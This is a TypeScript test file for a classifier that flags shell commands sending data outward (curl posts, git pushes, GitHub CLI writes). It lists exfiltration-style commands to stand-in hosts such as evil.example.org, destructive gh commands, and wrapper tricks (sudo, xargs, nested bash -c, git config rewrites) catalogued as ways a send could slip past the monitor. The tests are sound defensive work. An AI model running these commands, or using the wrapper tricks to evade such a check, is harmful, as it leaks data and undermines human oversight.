// The outbound classifier's round-3 additions (execution-safety-recovery
// D4, CC findings 15d08a1a): reserved words and wrapping commands no longer
// hide a send, git config overrides pin case-insensitively, gh repo fork
// never targets origin, bare host:port URLs read, and value flags never
// contribute targets. Split from outboundClassify.test.ts when that file
// outgrew the 500-LOC rule; the shared harness is outboundClassifyFacts.ts,
// so every expectation judges against the same world. Reserved example
// names throughout.
import { describe, expect, test } from 'bun:test'
import { parseSends } from '../outbound/rules'
import { verdictOf } from './outboundClassifyFacts'

describe('CC round 3: wrappers, reserved words, and git pinning', () => {
  test('reserved words and wrappers with options no longer hide the send', () => {
    const cases: Array<[string, string]> = [
      ['xargs -t curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['if curl -d x https://host.example.org/hook; then echo ok; fi', 'host:host.example.org'],
      ['while true; do curl -d x https://host.example.org/hook; done', 'host:host.example.org'],
      ['! curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['time curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['sudo -u bob curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['timeout -s KILL 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['timeout 5s curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['nice -n 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['stdbuf -oL curl -d x https://host.example.org/hook', 'host:host.example.org'],
      ['ionice -c3 curl -d x https://host.example.org/hook', 'host:host.example.org'],
    ]
    for (const [command, destination] of cases) {
      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'violation', destination })
    }
  })

  test('sudo -E keeps the git push, and a wrapper flag nobody knows reads unknown', () => {
    expect(verdictOf('sudo -E git push fork')).toMatchObject({ rule: 'git-push' })
    expect(verdictOf('sudo -Z curl -d x https://host.example.org/hook')).toEqual({
      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
    })
    expect(verdictOf('xargs --strange-flag curl -d x https://host.example.org/hook')).toEqual({
      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the xargs options were not understood',
    })
  })

  test('git -c overrides and config env pin the target, case-insensitively', () => {
    for (const command of [
      'git -c branch.main.pushRemote=fork push',
      'git -c Remote.origin.pushurl=https://github.com/other/repo.git push',
      'git -c url.https://github.com/.insteadOf=https://example.internal/ push',
      'git --config-env=GIT_AUTHOR_NAME.env_var push',
    ]) {
      expect(verdictOf(command)).toEqual({
        rule: 'git-push',
        verdict: 'unknown-destination',
        destination: /config-env/.test(command) ? 'unresolved:git --config-env pins the target' : 'unresolved:a git -c override pins the target',
      })
    }
    expect(verdictOf('GIT_CONFIG_COUNT=2 git push')).toMatchObject({
      rule: 'git-push', verdict: 'unknown-destination',
    })
    expect(verdictOf('GIT_CONFIG_PARAMETERS=remote.origin.url=x git push')).toMatchObject({
      rule: 'git-push', verdict: 'unknown-destination',
    })
  })

  test('gh repo create value flags are never read as the name', () => {
    expect(verdictOf('gh repo create -d "A repo" -t core-team new-repo')).toEqual({
      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/new-repo",
    })
    expect(verdictOf('gh repo fork --org acme other/kawai')).toEqual({
      rule: 'gh-write', verdict: 'violation', destination: 'github:acme/kawai',
    })
    expect(verdictOf('gh repo fork --fork-name kawai-two acme/kawai')).toEqual({
      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/kawai-two",
    })
  })

  test('a bare host:port URL reads as host and port, never an empty host', () => {
    // The harness's classes leave localhost external; the host must read.
    expect(verdictOf('curl -d x localhost:8080/hook')).toEqual({
      rule: 'http-send', verdict: 'violation', destination: 'host:localhost',
    })
    expect(verdictOf('curl -d x host.example.org:9292/hook')).toEqual({
      rule: 'http-send', verdict: 'violation', destination: 'host:host.example.org',
    })
    // scp-shaped text is no http URL: it reads unresolved, not guessed.
    expect(verdictOf('curl -d x git@github.com:acme/x.git')).toEqual({
      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:no URL in the command',
    })
  })

  test('a value flag consumes its value: -w never contributes a target (CC round 3)', () => {
    // If -w stopped being a value flag, its URL-shaped value would become a
    // positional and a second http-send candidate would appear.
    const candidates = parseSends('curl -w https://host.example.org/marker -d x https://api.example.org/hook', '/repo')
    expect(candidates).toHaveLength(1)
    expect(candidates[0]?.target).toEqual({ kind: 'host', host: 'api.example.org' })
  })

  test('an earlier git config or remote rewrite pins a later push (CC round 4 C)', () => {
    for (const command of [
      'git config remote.pushDefault exfil; git push',
      'git config branch.main.pushRemote exfil && git push',
      'git remote add evil https://github.com/evil/x.git; git push',
      'git remote set-url origin https://github.com/evil/x.git; git push',
      'git remote rename origin exfil; git push',
    ]) {
      expect(verdictOf(command)).toMatchObject({
        rule: 'git-push',
        verdict: 'unknown-destination',
        destination: 'unresolved:an earlier git config or remote command pins the target',
      })
    }
    // A config write outside remote/url/branch keys pins nothing.
    expect(verdictOf('git config user.name dev; git push')).toMatchObject({
      rule: 'git-push', verdict: 'allowed', destination: 'github:origin',
    })
  })

  test('wrappers hiding a shell or env are all seen; one -c level only (CC round 4 D)', () => {
    // Every CC bypass form resolves to its real send, not silence.
    const sends: Array<[string, string]> = [
      ['sudo bash -c "git push https://github.com/evil/x"', 'github:evil/x'],
      ['nohup sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
      ['xargs sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
      ['sudo env git push fork main', 'github:other/fork'],
      ['env -- curl -d x https://host.example.org/hook', 'host:host.example.org'],
    ]
    for (const [command, destination] of sends) {
      expect(verdictOf(command)).toMatchObject({ verdict: 'violation' as const, destination })
    }
    // env -C moves the effective cwd: /other holds no repository in the
    // facts, so the push reads unresolved, never silently allowed.
    expect(verdictOf('env -C /other git push')).toMatchObject({
      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no repository at the cwd',
    })
    // Assignments through a wrapper pin exactly as bare ones do.
    expect(verdictOf('sudo GIT_DIR=/x/.git git push')).toMatchObject({ rule: 'git-push', verdict: 'unknown-destination' })
    expect(verdictOf('timeout 5 env GH_REPO=evil/x gh pr create --title x')).toMatchObject({ rule: 'gh-write', verdict: 'unknown-destination' })
  })

  test('a second -c level, env -S, and unknown wrapper flags read unresolved, labeled by the wrapped command', () => {
    expect(verdictOf('bash -c "bash -c \\"curl -d x https://evil.example.org\\""')).toMatchObject({
      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:a second -c level is never unwrapped',
    })
    expect(verdictOf('env -S "git push"')).toMatchObject({
      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the env options were not understood',
    })
    // The fallback label names the WRAPPED command, never the wrapper.
    expect(verdictOf('sudo -Z git push origin main')).toMatchObject({
      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
    })
    expect(verdictOf('xargs --strange curl -d x https://host.example.org')).toMatchObject({
      rule: 'http-send', verdict: 'unknown-destination',
    })
  })

  test('gh writes aimed at another repo never read as origin (CC round 4 E)', () => {
    for (const command of [
      'gh pr comment https://github.com/evil/x/pull/1 -b hi',
      'gh issue comment https://github.com/evil/x/issues/2 -b hi',
      'gh pr merge https://github.com/evil/x/pull/3',
      'gh repo delete evil/x --yes',
      'gh repo edit evil/x --visibility public',
      'gh repo archive evil/x',
      'gh repo rename new-name -R evil/x',
      'gh issue transfer 1 evil/x',
      'gh secret set N --org evilorg',
      'gh variable set N --org evilorg',
    ]) {
      expect(verdictOf(command)).toMatchObject({ rule: 'gh-write', verdict: 'violation' as const })
    }
    expect(verdictOf('gh pr comment https://github.com/evil/x/pull/1 -b hi')).toMatchObject({ destination: 'github:evil/x' })
    expect(verdictOf('gh issue transfer 1 evil/x')).toMatchObject({ destination: 'github:evil/x' })
    expect(verdictOf('gh secret set N --org evilorg')).toMatchObject({ destination: 'github:evilorg' })
    // With nothing foreign named, origin still reads allowed.
    expect(verdictOf('gh pr create --title x')).toEqual({ rule: 'gh-write', verdict: 'allowed', destination: 'github:origin' })
  })
})
